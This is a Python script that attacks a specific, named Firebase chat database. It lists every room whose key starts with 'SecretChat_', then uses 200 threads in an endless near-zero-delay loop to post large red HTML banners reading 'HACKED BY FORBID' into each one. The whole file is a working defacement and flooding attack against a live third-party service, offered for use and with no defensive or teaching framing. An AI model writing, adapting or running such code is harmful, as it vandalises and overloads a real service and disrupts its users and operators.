import time
import requests
from concurrent.futures import ThreadPoolExecutor

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Ultimate Nuclear Broadcaster Fully Engaged...")

session = requests.Session()

def blast_room(room_url):
    try:
        # Massive RichText formatting for oversized, prominent alerts
        payload = {
            "Sender": "<b><font size='28' color='#FF0000'>FORBID</font></b>",
            "Message": "<b><font size='24' color='#FF0000'>HACKED BY FORBID | DISCORD: forbiddenway</font></b>",
            "Text": "<b><font size='24' color='#FF0000'>HACKED BY FORBID | DISCORD: forbiddenway</font></b>",
            "Timestamp": int(time.time() * 1000),
            "Aura": "voidWings",
            "Color": "red"
        }
        session.post(room_url, json=payload, headers=headers, timeout=1)
    except Exception:
        pass

while True:
    try:
        root_response = session.get(f"{database_url}/.json", timeout=3)
        
        if root_response.status_code == 200:
            data = root_response.json()
            if isinstance(data, dict):
                room_urls = [
                    f"{database_url}/{key}.json" 
                    for key in data.keys() 
                    if key.startswith("SecretChat_")
                ]
                
                if room_urls:
                    # Maximum parallel threads to hit every server simultaneously
                    with ThreadPoolExecutor(max_workers=200) as executor:
                        executor.map(blast_room, room_urls)
                    print(f"[FORBID] Mega-blast wave delivered to {len(room_urls)} active servers!")
                    
    except Exception as e:
        print(f"[FORBID] Loop error: {e}")
        
    # Zero delay for continuous full-throttle flooding
    time.sleep(0.01)
